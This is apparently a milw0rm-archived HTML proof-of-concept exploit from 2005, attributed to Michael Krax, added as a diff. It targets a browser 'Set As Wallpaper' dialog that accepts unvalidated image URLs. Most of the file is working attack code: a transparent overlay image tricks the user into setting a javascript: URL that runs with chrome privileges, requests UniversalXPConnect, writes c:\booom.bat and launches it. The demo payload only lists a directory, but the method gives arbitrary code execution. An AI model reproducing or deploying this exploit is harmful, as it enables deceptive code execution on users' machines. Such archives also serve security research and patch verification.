@@ -1,0 +1,51 @@
+// Exploit by Michael Krax
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Firewalling - Proof-of-Concept</title>
+<script>
+function stopload() {
+// in some cases the javascript url never stops to load
+// therefore we force a stop after the real image got loaded
+window.setTimeout("window.stop()",1000);
+}
+</script>
+</head>
+<body>
+<div style="font-family:Verdana;font-size:11px;">
+
+<div style="font-family:Verdana;font-size:15px;font-weight:bold;">
+Firewalling - Proof-of-Concept</div>
+<div style="width:600px">
+The "Set As Wallpaper" dialog takes the image url as a parameter without validating it.
+This allows to execute javascript in chrome and to run arbitrary code.
+<br><br>
+By using absolute positioning and the moz-opacity filter an attacker can easily fool the
+user to think he is setting a valid image as wallpaper.
+<br><br>
+Right click on the image and choose "Set As Wallpaper". The demo requests
+UniversalXPConnect rights, creates c:\booom.bat and launches the batch file
+that shows a directoy listing in a dos box (Windows only).
+<br><br>
+
+<div style="position:relative; width:300px; height:250px;">
+<img src="javascript:/*-----------------------------*/eval('if(document.location.href.
+substr(0,6)==\'chrome\'){netscape.security.PrivilegeManager.enablePrivilege(\'
+UniversalXPConnect\');file=Components.classes[\'@mozilla.org/file/local;1\'].
+createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\'c:\\\\
+booom.bat\');file.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE,
+420);outputStream=Components.classes[\'@mozilla.org/network/file-output-stream;
+1\'].createInstance(Components.interfaces.nsIFileOutputStream);outputStream.init
+(file,0x04|0x08|0x20,420,0);output=\'@ECHO OFF\\n:BEGIN\\nCLS\\nDIR\\nPAUSE
+\\n:END\';outputStream.write(output,output.length);outputStream.close();file.launch
+();}else{void(0)}')" width="300" height="250" alt="" border="0" style="position:
+absolute; left:0px; top:0px; z-index:2; -moz-opacity:0;">
+<img src="http://www.milw0rm.com/images/logo.png" width="300" height="250" alt="" border="0" style="position:
+absolute; left:0px; top:0px; z-index:1;" onload="stopload()">
+</div>
+</div>
+</body>
+
+</html>
+
+# milw0rm.com [2005-07-13]
